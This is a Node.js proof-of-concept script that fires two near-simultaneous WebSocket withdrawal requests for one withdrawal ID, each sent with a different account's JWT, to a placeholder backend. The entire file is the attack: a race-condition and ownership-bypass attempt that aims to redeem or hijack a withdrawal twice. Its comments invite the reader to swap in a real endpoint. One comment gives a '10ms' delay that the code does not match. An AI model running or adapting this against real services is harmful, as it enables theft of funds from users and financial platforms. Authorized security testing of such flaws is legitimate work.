import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://example-backend.com/"; // replace with real endpoint
const origin = "https://app.example.com";

// 🔑 two different JWTs (simulating two accounts)
const jwtA = "Bearer <JWT_A>";
const jwtB = "Bearer <JWT_B>";

const withdrawalId = "b2c9f30f-eaca-4b23-bc00-65d0ed61c356"; // same withdrawal targeted by both

function makeWithdrawString(jwt, id) {
  return JSON.stringify({
    type: "WITHDRAWAL_USE",
    data: {
      params: { withdrawalId: id },
    },
    // each request has a fresh nonce
    nonce: uuidv4(),
    // ⚠️ imagine backend mistakenly trusts JWT but doesn't validate ownership
    meta: { jwt },
  });
}

function connectAndSend(jwt, label) {
  const ws = new WebSocket(endpoint, {
    headers: { Origin: origin, Authorization: jwt },
    perMessageDeflate: false,
  });

  ws.on("open", () => {
    console.log(`✅ ${label} connected, sending withdrawal request...`);
    ws.send(makeWithdrawString(jwt, withdrawalId));
  });

  ws.on("message", (msg) => {
    console.log(`📩 Response for ${label}:`, msg.toString());
  });

  ws.on("error", (err) => {
    console.error(`❌ ${label} error:`, err.message);
  });
}

// 🚀 Blast both requests at nearly the same time
connectAndSend(jwtA, "Account A");
setTimeout(() => connectAndSend(jwtB, "Account B"), 1); // 10ms apart
